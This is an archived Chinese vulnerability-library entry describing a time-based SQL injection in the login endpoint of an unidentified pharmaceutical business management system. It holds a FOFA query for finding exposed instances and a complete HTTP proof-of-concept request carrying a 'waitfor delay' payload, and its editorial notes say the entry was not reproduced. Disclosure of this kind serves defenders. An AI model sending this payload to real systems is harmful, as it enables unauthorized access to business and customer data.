---
source: "wy876 漏洞文库"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
title: "医药公司登录系统Login存在SQL注入漏洞"
product: "医药业务管理系统待确认厂商"
record_type: "unknown"
document_type: "技术文章（细分类待核）"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
prerequisites: "缺版本厂商修复与SQL语句上下文"
side_effects: "原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%85%B6%E4%BB%96%E8%BD%AF%E4%BB%B6/%E6%9D%82%E9%A1%B9/%E5%8C%BB%E8%8D%AF%E5%85%AC%E5%8F%B8%E7%99%BB%E5%BD%95%E7%B3%BB%E7%BB%9FLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
archive_commit: "41940cb0038d09ca5aaddbe5bffb923e423d210f"
source_status: "recorded"
source_note: "正文标注的原文链接；链接内容及权威性未在本次重新核验"
fofa: "body=\"ResourceScripts/zh-cn-Login.aspx.js\""
source_url: "https://www.yuque.com/xiaokp7/ocvun2/nttl3oy8wgueg1gq"
id: "vw-e6754ea764a039dc1a6c0ed8"
entity_id: "ve-e6754ea764a039dc1a6c0ed8"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 医药公司登录系统Login存在SQL注入漏洞

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

<!-- vulwiki-editorial-rebuild:system-misc -->
## 条目范围与校订

- 本文对象：医药业务管理系统待确认厂商
- 文献类型：技术文章（细分类待核）
- 版本、权限及部署边界：缺版本厂商修复与SQL语句上下文
- 核验状态：仅重建文本校订；未执行文中代码、PoC 或扫描，未把截图或转载声明记为本站复现

### 具体结论与待核项

以下为原归档的逐项勘误与证据缺口；可由文本确定的问题已在下文订正，仍缺来源的事实保持待核。

1. 产品名称过泛无法可靠去重/归因
2. 长功能简介无技术出处
3. FOFA元数据body=截断
4. 延迟5秒只单请求无基线/对照响应
5. 缺版本厂商修复与SQL语句上下文
6. 保留原语雀来源

### 操作风险

原文技术操作的实际副作用未复现核验；按其请求/代码评估状态变更、凭据暴露和业务影响

技术请求、代码与实验方法按原文保留；其中的破坏性动作仅限授权、可恢复的隔离环境。缺失代码、参数或版本事实不猜补。

### 来源追溯

- 原文标注出处：<https://www.yuque.com/xiaokp7/ocvun2/nttl3oy8wgueg1gq>

### 归档技术正文

# 一、漏洞简介
医药公司登录系统是一个全面且高效的管理工具，涵盖了销售管理、客户档案管理、药品字典管理等多个核心模块。该系统支持前台零售、批发销售、销售审核等多种销售方式，并具备完善的客户档案管理功能，包括客户的基本信息、经营权限等。此外，系统还提供国药标准药品字典库云下载功能，便于用户快速获取药品信息。整体而言，医药公司登录系统通过自动化的管理和数据分析，帮助医药企业优化业务流程，提升市场竞争力。

# 二、影响版本
+ 医药公司登录系统

# 三、资产测绘
+ fofa`body="ResourceScripts/zh-cn-Login.aspx.js"`


# 四、漏洞复现
```http
POST /Login.aspx/CheckUser HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
X-Requested-With: XMLHttpRequest
Content-Type: application/json; charset=utf-8
Priority: u=1

{"value":"' waitfor delay '0:0:5'--+"}
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/nttl3oy8wgueg1gq>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
